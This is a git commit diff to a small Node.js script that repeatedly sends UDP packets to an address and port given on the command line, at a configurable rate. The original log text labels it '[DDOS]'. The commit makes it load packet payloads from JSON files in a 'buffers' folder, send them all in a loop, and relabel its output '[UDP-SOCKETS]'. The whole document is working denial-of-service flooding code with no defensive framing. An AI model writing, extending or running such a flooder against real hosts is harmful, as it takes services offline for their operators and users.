c5a34cff390b063d5524a0dfaf3087b9ebd13e4a
LearXD <gutyxdcanal@gmail.com>
2022-07-25 13:24:05 -0300

    Update

--- index.js
+++ index.js
@@ -1,6 +1,11 @@
 const dgram = require('dgram');
 const client = dgram.createSocket('udp4');
 
+const fs = require('fs');
+const path = require('path');
+
+let packets = [];
+
 const args = process.argv;
 
 const address = args[2]
@@ -11,12 +16,23 @@ const times = args[4] ?? 1000
 if(!address || !port)
   return console.log('[ERROR] Use: \'node . <address> <port> [<times>]\'')
 
+  
+fs.readdirSync(path.join(__dirname, 'buffers')).map((file, a) => {
+  const filePath = path.join(__dirname, 'buffers', file)
+  const data = JSON.parse(fs.readFileSync(filePath));
+  data.buffer && packets.push(data.buffer)
+})  
+
+
 client.on('error', (e) => {
   console.log('[ERROR]: ' + e)
   process.kill(process.pid);
 })
 
 setInterval(() => {
-    client.send('', 0, 0, port, address);
-    console.log(`[DDOS] Sending packets to ${address}:${port}...`)
+    packets.forEach(buffer => {
+      client.send(buffer, 0, buffer.length, port, address);
+    })
+    
+    console.log(`[UDP-SOCKETS] Sending ${packets.length} packets to ${address}:${port}...`)
 }, (1000 / (times <= 0 ? 1000 : times)))
